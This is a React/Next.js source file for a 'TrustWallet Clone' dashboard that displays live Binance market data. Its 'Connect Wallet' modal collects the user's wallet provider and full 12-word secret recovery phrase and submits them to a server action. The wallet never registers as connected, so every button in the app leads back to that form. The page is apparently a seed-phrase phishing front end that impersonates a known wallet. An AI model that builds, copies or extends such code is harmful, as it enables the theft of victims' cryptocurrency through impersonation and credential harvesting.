'use client'

import { useState, useEffect } from 'react'
import { useFormState, useFormStatus } from 'react-dom'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  FaWallet, 
  FaCheck, 
  FaExclamationTriangle,
  FaChartLine,
  FaExchangeAlt,
  FaCoins,
  FaHistory,
 
  FaUser,
  FaQrcode,
 
} from 'react-icons/fa'
import { connectWallet } from '@/lib/walletActions'
import { Loader } from './loader'
 
const initialState = {
  success: false,
  error: null,
  walletId: null,
  walletProvider: null
}

function SubmitButton() {
  const { pending } = useFormStatus()

  return (
    <motion.button
      type="submit"
      disabled={pending}
      whileHover={{ scale: 1.02 }}
      whileTap={{ scale: 0.98 }}
      className={`w-full py-3 px-4 rounded-lg font-medium flex items-center justify-center gap-2 ${
        pending ? 'bg-gray-400' : 'bg-blue-600 hover:bg-blue-700'
      } text-white transition-colors`}
    >
      {pending ? (
        <Loader size="sm" />
      ) : (
        <>
          <FaWallet />
          Connect Wallet
        </>
      )}
    </motion.button>
  )
}

function WalletConnectionModal({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) {
  const [state, formAction] = useFormState(connectWallet, initialState)
  const [secretPhrase, setSecretPhrase] = useState('')
  const [walletProvider, setWalletProvider] = useState('')

  useEffect(() => {
    if (state?.success) {
      const timer = setTimeout(() => {
        onClose()
      }, 2000)
      return () => clearTimeout(timer)
    }
  }, [state?.success, onClose])

  const handleSecretPhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const value = e.target.value
    if (value === '' || /^[\d\s\w,]*$/.test(value)) {
      setSecretPhrase(value)
    }
  }

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
          onClick={onClose}
        >
          <motion.div
            initial={{ scale: 0.9, y: 20 }}
            animate={{ scale: 1, y: 0 }}
            exit={{ scale: 0.9, y: 20 }}
            className="bg-white dark:bg-gray-800 rounded-xl shadow-xl w-full max-w-md"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="p-6">
              <div className="text-center mb-6">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 10, ease: "linear" }}
                  className="inline-block mb-4"
                >
                  <FaWallet className="text-4xl text-blue-500" />
                </motion.div>
                <h2 className="text-2xl font-bold text-gray-800 dark:text-white">Connect Your Wallet</h2>
              </div>

              {state?.error && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mb-4 p-3 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-100 rounded-lg flex items-center gap-2"
                >
                  <FaExclamationTriangle />
                  {state.error}
                </motion.div>
              )}

              {state?.success && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mb-4 p-3 bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-100 rounded-lg flex items-center gap-2"
                >
                  <FaCheck />
                  Wallet connected successfully!
                </motion.div>
              )}

              <form action={formAction} className="space-y-4">
                <div>
                  <label htmlFor="walletProvider" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Wallet Provider
                  </label>
                  <input
                    type="text"
                    id="walletProvider"
                    name="walletProvider"
                    value={walletProvider}
                    onChange={(e) => setWalletProvider(e.target.value)}
                    placeholder="e.g. Trust Wallet, Binance, etc."
                    className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:text-white"
                    required
                  />
                </div>

                <div>
                  <label htmlFor="secretPhrase" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Secret Recovery Phrase
                  </label>
                  <textarea
                    id="secretPhrase"
                    name="secretPhrase"
                    value={secretPhrase}
                    onChange={handleSecretPhraseChange}
                    placeholder="Enter your 12-word phrase in format: 1 word1,2 word2,...,12 word12"
                    rows={4}
                    className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:text-white"
                    required
                  />
                  <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                    Format: 1 word1,2 word2,3 word3,...,12 word12
                  </p>
                </div>

                <SubmitButton />
              </form>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}

export default function WalletDashboard() {
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [isWalletConnected, setIsWalletConnected] = useState(false)
  const [isModalOpen, setIsModalOpen] = useState(false)
  interface MarketData {
    symbol: string;
    lastPrice: string;
    priceChangePercent: string;
    quoteVolume: string;
  }

  const [marketData, setMarketData] = useState<MarketData[]>([])
  const [loading, setLoading] = useState(true)

  // Fetch Binance market data
  useEffect(() => {
    const fetchMarketData = async () => {
      try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/24hr')
        const data = await response.json()
        setMarketData(data.slice(0, 10)) // Get top 10 coins
        setLoading(false)
      } catch (error) {
        console.error('Error fetching market data:', error)
        setLoading(false)
      }
    }

    fetchMarketData()
    const interval = setInterval(fetchMarketData, 60000) // Update every minute

    return () => clearInterval(interval)
  }, [])

  const handleWalletConnect = () => {
    setIsModalOpen(true)
  }

  const handleCloseModal = () => {
    setIsModalOpen(false)
  }

  const handleActionClick = (action: string) => {
    if (!isWalletConnected) {
      setIsModalOpen(true)
    } else {
      // Handle the actual action when wallet is connected
      console.log(`Performing ${action} action`)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 dark:bg-gray-900">
      {/* Header */}
      <header className="bg-white dark:bg-gray-800 shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <FaWallet className="text-blue-500 text-2xl" />
            <h1 className="text-xl font-bold text-gray-800 dark:text-white">TrustWallet Clone</h1>
          </div>
          <button
            onClick={handleWalletConnect}
            className={`px-4 py-2 rounded-full flex items-center gap-2 ${
              isWalletConnected 
                ? 'bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-100'
                : 'bg-blue-600 hover:bg-blue-700 text-white'
            } transition-colors`}
          >
            <FaWallet />
            {isWalletConnected ? 'Connected' : 'Connect Wallet'}
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6">
        {/* Balance Card */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-gradient-to-r from-blue-500 to-purple-600 rounded-xl p-6 text-white mb-6 shadow-lg"
        >
          <div className="flex justify-between items-start">
            <div>
              <p className="text-sm opacity-80">Total Balance</p>
              <h2 className="text-3xl font-bold mt-1">
                {isWalletConnected ? '$3,245.67' : 'Connect Wallet'}
              </h2>
              <p className="text-sm opacity-80 mt-2">
                {isWalletConnected ? '+5.2% (24h)' : 'To view your balance'}
              </p>
            </div>
            {isWalletConnected && (
              <button className="p-2 rounded-full bg-white bg-opacity-20 hover:bg-opacity-30">
                <FaQrcode />
              </button>
            )}
          </div>
        </motion.div>

        {/* Quick Actions */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="grid grid-cols-4 gap-4 mb-6"
        >
          {[
            { icon: <FaExchangeAlt size={20} />, label: 'Swap', action: 'swap' },
            { icon: <FaCoins size={20} />, label: 'Buy', action: 'buy' },
            { icon: <FaChartLine size={20} />, label: 'Trade', action: 'trade' },
            { icon: <FaHistory size={20} />, label: 'History', action: 'history' }
          ].map((item, index) => (
            <motion.button
              key={index}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => handleActionClick(item.action)}
              className="flex flex-col items-center justify-center p-4 bg-white dark:bg-gray-800 rounded-xl shadow-sm hover:shadow-md transition-all"
            >
              <div className="p-3 bg-blue-100 dark:bg-blue-900 rounded-full text-blue-600 dark:text-blue-300 mb-2">
                {item.icon}
              </div>
              <span className="text-sm font-medium text-gray-700 dark:text-gray-300">{item.label}</span>
            </motion.button>
          ))}
        </motion.div>

        {/* Market Data */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="bg-white dark:bg-gray-800 rounded-xl shadow-sm overflow-hidden mb-6"
        >
          <div className="p-4 border-b border-gray-200 dark:border-gray-700 flex justify-between items-center">
            <h3 className="font-bold text-gray-800 dark:text-white">Market</h3>
            <button className="text-sm text-blue-600 dark:text-blue-400">View All</button>
          </div>
          {loading ? (
            <div className="p-8 flex justify-center">
              <Loader />
            </div>
          ) : (
            <div className="divide-y divide-gray-200 dark:divide-gray-700">
              {marketData.map((coin) => (
                <div key={coin.symbol} className="p-4 flex justify-between items-center hover:bg-gray-50 dark:hover:bg-gray-700">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 rounded-full bg-gray-200 dark:bg-gray-600 flex items-center justify-center">
                      <span className="text-xs font-bold">{coin.symbol.substring(0, 2)}</span>
                    </div>
                    <div>
                      <p className="font-medium text-gray-800 dark:text-white">{coin.symbol}</p>
                      <p className="text-xs text-gray-500 dark:text-gray-400">
                        ${parseFloat(coin.lastPrice).toFixed(2)}
                      </p>
                    </div>
                  </div>
                  <div className={`text-right ${
                    parseFloat(coin.priceChangePercent) >= 0 
                      ? 'text-green-500' 
                      : 'text-red-500'
                  }`}>
                    <p>{parseFloat(coin.priceChangePercent).toFixed(2)}%</p>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      Vol: {(parseFloat(coin.quoteVolume) / 1000000).toFixed(2)}M
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </motion.div>

        {/* TradingView Widget Placeholder */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
          className="bg-white dark:bg-gray-800 rounded-xl shadow-sm overflow-hidden mb-6 h-96"
        >
          <div className="p-4 border-b border-gray-200 dark:border-gray-700">
            <h3 className="font-bold text-gray-800 dark:text-white">BTC/USDT Chart</h3>
          </div>
          <div className="h-full flex items-center justify-center text-gray-500 dark:text-gray-400">
            {isWalletConnected ? (
              <div className="text-center p-6">
                <FaChartLine className="text-4xl mx-auto mb-4 text-blue-500" />
                <p>TradingView Chart Widget</p>
                <p className="text-sm mt-2">Real-time price data would be displayed here</p>
              </div>
            ) : (
              <div className="text-center p-6">
                <FaWallet className="text-4xl mx-auto mb-4 text-blue-500" />
                <p>Connect your wallet to view charts</p>
                <button 
                  onClick={handleWalletConnect}
                  className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
                >
                  Connect Wallet
                </button>
              </div>
            )}
          </div>
        </motion.div>
      </main>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 bg-white dark:bg-gray-800 shadow-lg border-t border-gray-200 dark:border-gray-700">
        <div className="container mx-auto px-4">
          <div className="flex justify-around">
            {[
              { icon: <FaChartLine />, label: 'Market' },
              { icon: <FaWallet />, label: 'Wallet' },
              { icon: <FaExchangeAlt />, label: 'Trade' },
              { icon: <FaUser />, label: 'Profile' }
            ].map((item, index) => (
              <button
                key={index}
                onClick={() => handleActionClick(item.label.toLowerCase())}
                className="flex flex-col items-center py-3 px-4 text-gray-500 dark:text-gray-400 hover:text-blue-500 dark:hover:text-blue-400"
              >
                {item.icon}
                <span className="text-xs mt-1">{item.label}</span>
              </button>
            ))}
          </div>
        </div>
      </nav>

      {/* Wallet Connection Modal */}
      <WalletConnectionModal isOpen={isModalOpen} onClose={handleCloseModal} />
    </div>
  )
}